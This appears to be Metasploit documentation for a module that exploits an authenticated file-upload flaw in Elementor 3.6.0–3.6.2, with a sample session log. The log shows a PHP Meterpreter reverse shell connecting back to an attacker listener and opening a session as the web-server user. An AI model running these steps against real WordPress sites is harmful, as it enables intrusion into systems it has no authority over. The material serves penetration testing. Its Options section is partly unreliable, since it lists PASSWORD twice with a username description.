## Vulnerable Application

The WordPress plugin Elementor versions 3.6.0 - 3.6.2, inclusive have a vulnerability
that allows any authenticated user to upload and execute any PHP file. This is achieved
by sending a request to install Elementor Pro from a user supplied zip file.
Any user with Subscriber or more permissions is able to execute this.

Tested against Elementor 3.6.1

### Plugin

Can be downloaded from https://wordpress.org/plugins/elementor/advanced/

## Verification Steps


1. Install the plugin, no configuration is required, just hit skip.
2. Start msfconsole
3. Do: `use exploits/multi/http/wp_plugin_elementor_auth_upload_rce`
4. Do: `set username [username]`
5. Do: `set password [password]`
6. Do: `set rhosts [ip]`
7. Do: `run`
8. You should get a shell.

## Options

### PASSWORD

The username for a user with subscriber or higher privileges

### PASSWORD

The username for a user with subscriber or higher privileges

## Scenarios


### Elementor 3.6.1 on Wordpress 5.7.7 on Ubuntu 20.04

```
resource (elementor.rb)> use exploits/multi/http/wp_plugin_elementor_auth_upload_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
resource (elementor.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (elementor.rb)> set username user
username => user
resource (elementor.rb)> set password user
password => user
resource (elementor.rb)> set verbose true
verbose => true
msf6 exploit(multi/http/wp_plugin_elementor_auth_upload_rce) > run

[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/elementor/readme.txt
[*] Found version 3.6.1 in the plugin
[+] The target appears to be vulnerable.
[*] Looking for nonce
[+] Nonce: cfb42a92ae
[*] Uploading upgrade payload and activating...
[*] Payload file name: elementor-pro.php
[*] Sending stage (39927 bytes) to 2.2.2.2
[+] Deleted ../wp-content/plugins/elementor-pro
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:33052) at 2022-10-02 15:56:35 -0400
[+] Payload Uploaded Successfully

meterpreter > getuid
Server username: www-data
meterpreter > sysinfo
Computer    : wordpress2004
OS          : Linux wordpress2004 5.4.0-104-generic #118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64
Meterpreter : php/linux
```
